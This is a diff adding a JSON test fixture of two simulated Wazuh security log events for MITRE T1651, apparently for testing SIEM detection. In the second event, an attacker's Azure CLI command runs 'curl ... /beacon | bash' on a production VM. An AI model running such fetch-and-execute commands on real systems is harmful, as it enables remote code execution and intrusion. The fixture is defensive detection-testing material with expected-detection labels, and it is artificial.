@@ -1,0 +1,140 @@
+{
+  "_metadata": {
+    "attack_id": "T1651",
+    "variation": "002",
+    "name": "Cloud Administration Command - Azure VM Run Command",
+    "description": "Adversary uses Azure VM Run Command to execute code on virtual machines",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Azure Activity Log - VM Run Command",
+      "sequence": 1,
+      "timestamp": "2026-02-08T16:35:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T16:35:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Azure Activity - VM Run Command Executed",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1651"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Cloud Administration Command"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "azure",
+            "activity_log",
+            "compute"
+          ]
+        },
+        "agent": {
+          "id": "040",
+          "name": "wazuh.manager",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300074",
+        "decoder": {
+          "name": "azure-activity"
+        },
+        "location": "azure-activity-log",
+        "data": {
+          "azure": {
+            "operationName": "Microsoft.Compute/virtualMachines/runCommand/action",
+            "category": "Administrative",
+            "resultType": "Success",
+            "callerIpAddress": "198.51.100.110",
+            "caller": "compromised@corp.onmicrosoft.com",
+            "properties": {
+              "resourceId": "/subscriptions/abc123/resourceGroups/prod-rg/providers/Microsoft.Compute/virtualMachines/prod-web-01",
+              "entity": "prod-web-01",
+              "message": "RunPowerShellScript executed",
+              "commandId": "RunPowerShellScript"
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1651",
+        "_fomorian_expected_detection": "Sigma: Azure VM Run Command Executed (T1651)"
+      }
+    },
+    {
+      "_comment": "Linux Sysmon Event 1 - az vm run-command invoke",
+      "sequence": 2,
+      "timestamp": "2026-02-08T16:35:30.000Z",
+      "log": {
+        "timestamp": "2026-02-08T16:35:30.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon for Linux - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1651"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Cloud Administration Command"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "GW01",
+          "ip": "198.51.100.1"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300075",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 16:35:30.000",
+            "processGuid": "{A1B2C3D4-EXEC-1651-0002-000000000001}",
+            "processId": "41012",
+            "image": "/usr/bin/az",
+            "commandLine": "az vm run-command invoke --resource-group prod-rg --name prod-web-01 --command-id RunShellScript --scripts 'curl http://198.51.100.110/beacon | bash'",
+            "currentDirectory": "/home/attacker",
+            "user": "attacker",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1651-0002-PARENT000001}",
+            "parentProcessId": "41000",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1651",
+        "_fomorian_expected_detection": "Sigma: Azure CLI VM Run Command (T1651)"
+      }
+    }
+  ]
+}
